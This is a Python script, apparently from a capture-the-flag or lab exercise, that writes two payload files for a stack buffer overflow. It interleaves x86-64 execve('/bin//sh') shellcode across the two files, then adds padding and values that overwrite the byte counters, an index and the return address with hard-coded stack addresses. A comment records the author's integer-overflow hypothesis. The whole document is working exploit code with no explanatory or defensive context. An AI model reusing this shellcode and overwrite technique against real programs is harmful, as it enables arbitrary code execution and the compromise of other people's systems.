shell_code = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

with open("exploit1", "wb+") as f1:
    for i in range (0, len(shell_code), 2):
        f1.write(shell_code[i:i+1])

    f1.write(b'\xff'*(32-14)) # fill the rest of buf
    f1.write(b'\xff'*8) # e340 - e347

    """
    hypothesis: attempting to overwrite byte_read1 resulted in idx < byte_read1 + byte_read2
    because of integer overflow (since they are both \xff*4).
    
    try: assign both to be \x40
    """
    f1.write(b'\x00'*2) # e350 - e351

    f1.write(b'\x38') # e354: byte_read2??
    f1.write(b'\x00') # 3rd byte of int

    f1.write(b'\x38')  # byte_read1
    f1.write(b'\x00')  # 3rd byte of int

    f1.write(b'\x5c') # e35c: idx
    f1.write(b'\x00')

    f1.write(b'\x80\xff\xff\x00') # 112
    f1.write(b'\x90\xff\xff\x00') # return addr

with open("exploit2", "wb+") as f2:
    for j in range (1, len(shell_code), 2):
        f2.write(shell_code[j:j+1])

    f2.write(b'\x00'*(32-13))
    f2.write(b'\x00'*8) # e348 - e34f

    f2.write(b'\x00'*2) # e352 - e353

    f2.write(b'\x00'*2) # e354: byte_read2

    f2.write(b'\x00'* 2)  # byte_read1

    f2.write(b'\x00' * 2)  # idx

    f2.write(b'\xe3\xff\x7f\x00') # 112
    f2.write(b'\xe3\xff\x7f\x00') # return

